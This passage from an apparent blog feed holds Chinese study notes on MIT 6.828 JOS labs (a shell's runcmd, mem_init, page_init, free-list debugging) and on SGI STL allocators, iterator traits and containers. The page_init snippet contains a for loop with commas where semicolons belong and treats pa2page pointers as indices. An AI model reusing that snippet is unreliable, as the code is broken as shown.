class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute cmd.  Never returns.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">runcmd</span><span class="params">(<span class="keyword">struct</span> cmd *cmd)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> p[<span class="number">2</span>], r;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">execcmd</span> *<span class="title">ecmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipecmd</span> *<span class="title">pcmd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">redircmd</span> *<span class="title">rcmd</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(cmd == <span class="number">0</span>)</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">switch</span>(cmd-&gt;type){</span><br><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"unknown runcmd\n"</span>);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">' '</span>:</span><br><span class="line">    ecmd = (<span class="keyword">struct</span> execcmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(ecmd-&gt;argv[<span class="number">0</span>] == <span class="number">0</span>)</span><br><span class="line">      _exit(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Your code here ...</span></span><br><span class="line">    execve(ecmd-&gt;argv[<span class="number">0</span>],ecmd-&gt;argv,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'&gt;'</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="string">'&lt;'</span>:</span><br><span class="line">    rcmd = (<span class="keyword">struct</span> redircmd*)cmd;</span><br><span class="line">    <span class="comment">// Your code here ...</span></span><br><span class="line">    r = open(rcmd-&gt;file,rcmd-&gt;flags,S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);</span><br><span class="line">    <span class="keyword">if</span>(r==<span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">      perror(<span class="string">"no such file"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(dup2(r,rcmd-&gt;fd)==<span class="number">-1</span>)</span><br><span class="line">      perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">    runcmd(rcmd-&gt;cmd);</span><br><span class="line">    close(rcmd-&gt;fd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> <span class="string">'|'</span>:</span><br><span class="line">    <span class="keyword">if</span>(pipe(p)==<span class="number">-1</span>)</span><br><span class="line">      perror(<span class="string">"pipe create error"</span>);</span><br><span class="line">    pcmd = (<span class="keyword">struct</span> pipecmd*)cmd;</span><br><span class="line">    <span class="keyword">if</span>(fork1()==<span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">      close(p[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">if</span>(dup2(p[<span class="number">1</span>],STDOUT_FILENO)==<span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">      runcmd(pcmd-&gt;left);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">          wait(&amp;r);</span><br><span class="line">          close(p[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">if</span>(dup2(p[<span class="number">0</span>],STDIN_FILENO)==<span class="number">-1</span>)</span><br><span class="line">        perror(<span class="string">"dup2 fail"</span>);</span><br><span class="line">      runcmd(pcmd-&gt;right);   </span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  }    </span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="Lab-2-Memory-Management"><a href="#Lab-2-Memory-Management" class="headerlink" title="Lab 2: Memory Management"></a>Lab 2: Memory Management</h2><h3 id="mem-init流程分析"><a href="#mem-init流程分析" class="headerlink" title="mem_init流程分析"></a>mem_init流程分析</h3><p>可以先看完下面的部分再来看流程分析.<br>删去了注释和check.<br>先<code>i386_detect_memory</code>检测机器的物理空间大小,然后使用boot_alloc分配一个kern_pgdir的页目录表.<br>再次boot_alloc为每一个物理页分配一个PageInfo管理结构.<br>之后<code>page_init</code>完成对整个物理页的初始化.标记不可分配或正在使用的物理页为inuse,完成空闲页链表page_free_list的创建.<br>在之后调用三次boot_map_region在kern_pgdir中完成对用户页表UPAGES,内核栈,内核地址空间的映射.<br>安装kern_pgdir替换之前临时的entry_pgdir.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">mem_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">uint32_t</span> cr0;</span><br><span class="line"><span class="type">size_t</span> n;</span><br><span class="line"></span><br><span class="line">i386_detect_memory();</span><br><span class="line"></span><br><span class="line">kern_pgdir = (<span class="type">pde_t</span> *) boot_alloc(PGSIZE);</span><br><span class="line"><span class="built_in">memset</span>(kern_pgdir, <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kern_pgdir[PDX(UVPT)] = PADDR(kern_pgdir) | PTE_U | PTE_P;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pages = (<span class="keyword">struct</span> PageInfo* )boot_alloc(npages*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo));</span><br><span class="line"><span class="built_in">memset</span>(pages,<span class="number">0</span>,npages*(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">page_init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, UPAGES, npages*<span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo), PADDR(pages), PTE_U|PTE_P);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir,KSTACKTOP-KSTKSIZE,KSTKSIZE,PADDR(bootstack),PTE_W|PTE_P);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boot_map_region(kern_pgdir, KERNBASE, (<span class="number">1ULL</span> &lt;&lt; <span class="number">32</span>) - KERNBASE, <span class="number">0</span>, PTE_W);</span><br><span class="line"></span><br><span class="line">lcr3(PADDR(kern_pgdir));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cr0 = rcr0();</span><br><span class="line">cr0 |= CR0_PE|CR0_PG|CR0_AM|CR0_WP|CR0_NE|CR0_MP;</span><br><span class="line">cr0 &amp;= ~(CR0_TS|CR0_EM);</span><br><span class="line">lcr0(cr0);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Part-1-Physical-Page-Management"><a href="#Part-1-Physical-Page-Management" class="headerlink" title="Part 1: Physical Page Management"></a>Part 1: Physical Page Management</h3><p>写page_init之前回顾理解一下物理地址和虚拟地址的布局,在图中指出memlayout.h中各个宏定义表示的位置.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232009006.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232009885.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232010431.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">//设置第一页为inuse,保留实模式下的IDT和BIOS结构</span></span><br><span class="line"><span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将Base_memory全部设置为free.(basemem应该指低1MB的内存)</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; npages_basemem; ++i) {</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将IO hole设置为inuse,避免被分配.</span></span><br><span class="line"><span class="keyword">for</span>(i = pa2page(IOPHYSMEM),i&lt;pa2page(EXTPHYSMEM),++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将1MB以上的Kernel映像,kern_pgdir以及pages的页设置为inuse.</span></span><br><span class="line"><span class="keyword">for</span>(i = pa2page(EXTPHYSMEM);i&lt;pa2page(PADDR(boot_alloc(<span class="number">0</span>)));++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">pages[i].pp_link = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将上方所有物理地址设置为free</span></span><br><span class="line"><span class="keyword">for</span>(;i&lt;npages;++i)</span><br><span class="line">{</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>之后就是page_alloc(),page_free().<br>如下是初看时的一些疑惑,我知道很蠢hh<br><del>我暂时并不理解这两个功能存在的必要,特别是把释放的物理页对应的pageinfo链入page_free_list链表中的操作.</del><br><del>我们在meminit中已经调用bootalloc为所有的物理页分配了一个对应的pageinfo结构,这些结构即使被page_free释放之后也不会被其他用途的内存分配重用,不存在像常见的内存分配机制的设立是为了提高内存利用率的原因.</del><br>解答:释放pageinfo结构,其实是表示对pageinfo对应物理页的释放与分配,用于操作系统的追踪管理,与提高内存利用率无关.</p><blockquote><p>The operating system must keep track of which parts of physical RAM are free and which are currently in use. JOS manages the PC’s physical memory with page granularity so that it can use the MMU to map and protect each piece of allocated memory.</p></blockquote><p><del>更不理解的,pageinfo结构中并没有记录对应物理页的地址,page2pa函数是通过pageinfo结构相对于pages的偏移来计算出对应的物理页的.但当page_insert调用page_alloc是从free_list中取出最后free的pageinfo结构,不与物理地址对应.</del><br>解答:page_alloc的作用是分配客户(相对于该函数来说)申请的一页的物理地址空间,客户并不在乎该物理地址空间位于哪里,page_alloc只是随便取出一个pageinfo结构,并将该pageinfo结构对应的物理页分配给客户.是先有pageinfo结构再有对应的物理页,而不是为某个特定的物理页分配pageinfo结构,自然不存在无法对应的问题.</p><p>关于pgdir_walk() boot_map_region() page_lookup() page_remove() page_insert()等函数的实现,主要理清内核虚拟地址(KADDR),物理地址,物理页,PageInfo等结构的关系,实现完后跟着check的报错一点点调整.太多了就不放出来了.详见github.</p><h3 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h3><p>详见github.</p><h3 id="Part-3-Kernel-Address-Space"><a href="#Part-3-Kernel-Address-Space" class="headerlink" title="Part 3: Kernel Address Space"></a>Part 3: Kernel Address Space</h3><p>详见github.</p><h4 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h4><h5 id="物理页面映射打印"><a href="#物理页面映射打印" class="headerlink" title="物理页面映射打印"></a>物理页面映射打印</h5><p>模仿实验中qemu的info pg命令实现showmappings.<br>合并打印原则是权限位相同且物理页相邻的页表合并打印,页目录表始终不合并.其实改进也简单但是时间挺紧的…<br>qemu中的info pg:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271912082.png"><br>showmappings:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271913080.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271926936.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309271914406.png"></p><h4 id="一些小插曲"><a href="#一些小插曲" class="headerlink" title="一些小插曲"></a>一些小插曲</h4><p>memset崩了,刚开始猜测是引用到了当前页目录映射之外的物理地址,到崩溃现场之后发现又没问题,找了半天发现原来页目录表中虚拟地址低4MB没有写的权限。。。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202309232256150.png"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((__aligned__(PGSIZE)))</span><br><span class="line"><span class="type">pde_t</span> entry_pgdir[NPDENTRIES] = {</span><br><span class="line"><span class="comment">// Map VA's [0, 4MB) to PA's [0, 4MB)</span></span><br><span class="line">[<span class="number">0</span>]</span><br><span class="line">= ((<span class="type">uintptr_t</span>)entry_pgtable - KERNBASE) + PTE_P,</span><br><span class="line"><span class="comment">// Map VA's [KERNBASE, KERNBASE+4MB) to PA's [0, 4MB)</span></span><br><span class="line">[KERNBASE&gt;&gt;PDXSHIFT]</span><br><span class="line">= ((<span class="type">uintptr_t</span>)entry_pgtable - KERNBASE) + PTE_P + PTE_W</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>又突然想到page_init后,page_free_list指向的头部页应该位于物理内存的最高处,确实是在当前页目录映射之外的,确实应该崩.检查之后发现在check_page_free_list函数中有这样一个处理free_list的操作.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (only_low_memory) {</span><br><span class="line"><span class="comment">// Move pages with lower addresses first in the free</span></span><br><span class="line"><span class="comment">// list, since entry_pgdir does not map all pages.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">pp1</span>, *<span class="title">pp2</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> **<span class="title">tp</span>[2] =</span> { &amp;pp1, &amp;pp2 };</span><br><span class="line"><span class="keyword">for</span> (pp = page_free_list; pp; pp = pp-&gt;pp_link) {</span><br><span class="line"><span class="type">int</span> pagetype = PDX(page2pa(pp)) &gt;= pdx_limit;</span><br><span class="line">*tp[pagetype] = pp;</span><br><span class="line">tp[pagetype] = &amp;pp-&gt;pp_link;</span><br><span class="line">}</span><br><span class="line">*tp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">*tp[<span class="number">0</span>] = pp2;</span><br><span class="line">page_free_list = pp1;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SGI STL学习笔记</title>
      <link href="/2023/SGI-STL--Notes/"/>
      <url>/2023/SGI-STL--Notes/</url>
      
        <content type="html"><![CDATA[<p>所有内容均基于SGI STL.该项目仅作为本人学习C++STL库,数据结构与算法使用.</p><h2 id="内存置配器"><a href="#内存置配器" class="headerlink" title="内存置配器"></a>内存置配器</h2><p>容器使用内存置配器来进行内存空间的分配和释放.<br>为了适配STL标准,在实际使用的分配器实现一个上层接口类simple_alloc.该类默认使用第二级分配器</p><h3 id="第一级分配器-malloc-alloc-template"><a href="#第一级分配器-malloc-alloc-template" class="headerlink" title="第一级分配器 malloc_alloc_template"></a>第一级分配器 malloc_alloc_template</h3><p>该分配器在内部直接使用operator new/delete进行内存管理</p><h3 id="第二级分配器-default-alloc-template"><a href="#第二级分配器-default-alloc-template" class="headerlink" title="第二级分配器 default_alloc_template"></a>第二级分配器 default_alloc_template</h3><p>该分配器以小型内存池进行内存管理,减轻分配内存时的cookie占用的内存.</p><span id="more"></span><h4 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护一个free_list数组,每一个free_list是一个存放未分配内存的单向链表(的头指针).用来管理释放或未分配的内存.<br>另外维护两个所有二级分配器共用的静态指针start_free和end_free,分别指向空闲内存(空闲且未链入free_list)的首尾.<br>还有一个size_t类型的heap_size成员,在重新向操作系统malloc内存时会用到其来计算需要申请的空间大小,但不太懂其存在的意义.</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h5><p>当容器使用alloc分配空间时,若内存超过128bytes(MAX_BYTES)使用第一级分配器进行内存分配.反之使用第二级.</p><p>首先检查对应大小的free_list是否存在未分配空间.若有就直接取出.<br>如果没有,调用refill函数用空闲内存区域先填充free_list(内存充足的情况下每次链入20块),再取出一块完成分配.<br>refill函数其实只负责将从空闲内存区域取出的空间链入free_list,实际的取出工作由chunk_alloc函数完成.</p><p>chunk_alloc函数先检查空闲区域是否足够取出20个对应大小的堆块,若够则能取多少个取多少.如果一个的空间都不够,就先将空闲区域整个链入free_list对应大小链表中.然后调用malloc函数向系统申请2*20*nbytes(一个元素的大小)字节的空间.</p><h5 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h5><p>若内存超过128bytes,使用第一级分配器释放内存.<br>否则使用第二级分配器直接链入对应free_list中.</p><p>值得注意的时,第二级分配器并没有对free_list以及start_free~end_free之间区域的释放操作,这一操作最后将由操作系统完成?<br><a href="https://www.zhihu.com/question/38524347">STL allocator何时释放内存？</a></p><h2 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h2><p>迭代器用来粘合算法和容器.</p><h4 id="Traits技法"><a href="#Traits技法" class="headerlink" title="Traits技法"></a>Traits技法</h4><h5 id="template参数推导机制"><a href="#template参数推导机制" class="headerlink" title="template参数推导机制"></a>template参数推导机制</h5><p>在算法中使用迭代器时,可能会使用到迭代器所指之物的型别,该型别可以利用template参数推导机制完成.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(I iter)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);<span class="comment">//func2可通过参数推导机制获得iter所指型别</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但如果func函数需要返回一个iter指向的对象,template推导机制就不起作用了</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下列写法无法通过编译</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line">(*I) <span class="built_in">func</span>(I iter)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="内嵌型别声明"><a href="#内嵌型别声明" class="headerlink" title="内嵌型别声明"></a>内嵌型别声明</h5><p>我们可以使用内嵌型别声明的方法解决该问题.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Iterator</span>{</span><br><span class="line"><span class="keyword">typedef</span> T value_type;</span><br><span class="line">......</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">I</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">typename</span> I::value_type <span class="title">func</span><span class="params">(I iter)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="built_in">func2</span>(iter,*iter);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>对于泛型算法,不仅需要接受迭代器,还需要能够接受一个原生指针作为参数,而原生指针没有,我们也无法为其内嵌一个名为value_type的变量<br>于是需要用到traits技法</p><h5 id="Traits"><a href="#Traits" class="headerlink" title="Traits"></a>Traits</h5><p>使用中间层traits,利用template参数推导机制进行偏特化,将原生指针和迭代器统一.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202304061931218.webp"></p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span> {</span><br><span class="line">    <span class="keyword">typedef</span> <span class="keyword">typename</span> T::value_type value_type;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 偏特化1</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span>&lt;T*&gt; {</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 偏特化2</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">iterator_traits</span>&lt;<span class="type">const</span> T*&gt; {</span><br><span class="line">    <span class="keyword">typedef</span> T value_type;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>根据迭代器操作容器元素的方式,分为InputIterator和OutputIterator<br>根据迭代器遍历容器的方式,分为ForwardIterator,BidirectionalIterator,RandomAccessIterator等.</p><p>为了使函数能够获取迭代器的类型,将类型标签定义为一个新类型,再以traits方式型别声明为category,使用时进行萃取.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">input_iterator_tag</span>{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">output_iterator_tag</span>{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">forward_iterator_tag</span>:<span class="keyword">public</span> input_iterator_tag{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">bidirectional_iterator_tag</span>:<span class="keyword">public</span> forward_iterator_tag{};</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">random_access_iterator_tag</span>:<span class="keyword">public</span> bidirectional_iterator_tag{};</span><br></pre></td></tr></tbody></table></figure><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><p>单端开口的连续线性空间容器</p><h4 id="迭代器-1"><a href="#迭代器-1" class="headerlink" title="迭代器"></a>迭代器</h4><p>由于该容器的空间是连续线性的,故其迭代器为原生指针.迭代器在扩容后失效</p><h4 id="成员变量-1"><a href="#成员变量-1" class="headerlink" title="成员变量"></a>成员变量</h4><p>维护了三个指针(即vector的迭代器类型),start指向vector已存储区域的开头,finish指向vector中已存储区域的末尾,end_of_storage指向vector总存储空间的末尾.</p><h4 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h4><p>加入新元素时,若存储空间充足就直接在finish构造元素,若存储空间不足便申请二倍存储空间,将原空间内容拷贝到新申请的空间,再释放掉原有空间.<br>由于扩容操作会使vector中所有元素迁移,故迭代器失效.</p><h4 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h4><p>由于迭代器失效,若程序有对迭代器的保存动作,可能造成uaf,double free等安全问题.</p><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p>两端开口的双向环状链表</p><h4 id="迭代器-2"><a href="#迭代器-2" class="headerlink" title="迭代器"></a>迭代器</h4><p>Bidirectional迭代器.内嵌一个链表结点指针.以链表结点的指针完成迭代.迭代器不会失效</p><h4 id="成员变量-2"><a href="#成员变量-2" class="headerlink" title="成员变量"></a>成员变量</h4><p>仅维护一个环状链表中的空结点指针</p><h4 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h4><p>和普通双向环状链表区别不大.<br>注意一下5个基本操作,有助于对list空间结构的想象.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iterator <span class="title function_">begin</span><span class="params">()</span> { <span class="keyword">return</span> (link_type)(node-&gt;next); }</span><br><span class="line">iterator <span class="title function_">end</span><span class="params">()</span> { <span class="keyword">return</span> (link_type)node; }</span><br><span class="line"><span class="type">bool</span> <span class="title function_">empty</span><span class="params">()</span> { <span class="keyword">return</span> node-&gt;next == node; }</span><br><span class="line">reference <span class="title function_">front</span><span class="params">()</span> { <span class="keyword">return</span> *begin(); }</span><br><span class="line">reference <span class="title function_">back</span><span class="params">()</span> { <span class="keyword">return</span> *(--end()); }</span><br></pre></td></tr></tbody></table></figure><h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><p>两端开口的连续线性空间.(连续线性空间实则是伪造的)</p><h4 id="迭代器-3"><a href="#迭代器-3" class="headerlink" 